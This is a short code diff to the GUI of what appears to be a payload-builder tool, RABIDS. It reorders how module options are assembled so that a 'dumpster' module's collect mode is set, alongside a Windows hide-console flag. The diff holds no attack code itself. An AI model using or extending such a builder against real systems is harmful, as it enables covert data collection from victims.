@@ -1145,6 +1145,12 @@ class RABIDSGUI(QMainWindow):
 
         self.update_all_option_values()
 
+        options = []
+        for module_name in self.selected_modules:
+            if module_name in self.current_option_values:
+                for option_name, value in self.current_option_values[module_name].items():
+                    options.append(f"--option={option_name}={value}")
+
         if 'module/dumpster' in self.selected_modules:
             if not any("collectMode" in opt or "restoreMode" in opt for opt in options):
                  options.append("--option=collectMode=true")
@@ -1157,11 +1163,6 @@ class RABIDSGUI(QMainWindow):
         if self.hide_console_check.isChecked() and self.target_os_combo.currentText() == "windows":
             cmd.append("--hide-console")
 
-        options = []
-        for module_name in self.selected_modules:
-            if module_name in self.current_option_values:
-                for option_name, value in self.current_option_values[module_name].items():
-                    options.append(f"--option={option_name}={value}")
         cmd.extend(options)
 
         self.module_options_group.setTitle("BUILDING PAYLOAD...")
